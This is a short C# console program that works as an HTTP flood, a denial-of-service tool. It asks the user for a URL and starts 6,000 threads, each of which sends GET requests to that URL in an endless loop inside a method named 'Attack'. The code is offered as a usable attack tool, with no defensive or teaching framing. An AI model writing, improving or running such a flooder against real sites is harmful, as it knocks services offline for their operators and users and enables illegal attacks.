using System;

class Program
{
    private static readonly HttpClient _client = new HttpClient();
    private static int pcBlocks = 6000;
    public static void Main()
    {
        Console.Write("Please enter url : ");
        string url = Console.ReadLine()!;
        Run(url);
    }

    public static void Run(string url)
    {
        for (int index = 1; index <= pcBlocks; index++)
        {
            Console.Write("Process");
            Console.Write('.');
            Console.Write('.');
            Console.Write('.');
            Console.Clear();
            Thread thread = new Thread(() => Attack(url, index));
            thread.Start();
            if (index == 1000)
            {
                Console.WriteLine($"{index}");
                Thread.Sleep(1000);
            }
        }
        Console.ReadLine();
        Console.Write("Successful");
    }

    public static void Attack(string url, int pcblockNumber)
    {
        while (true)
        {
            HttpRequestMessage request = new HttpRequestMessage()
            {
                Method = HttpMethod.Get,
                RequestUri = new Uri(url)
            };
            var result = _client.Send(request);
            Console.WriteLine(pcblockNumber + "-pc received ->" + result.StatusCode);
        }
    }
}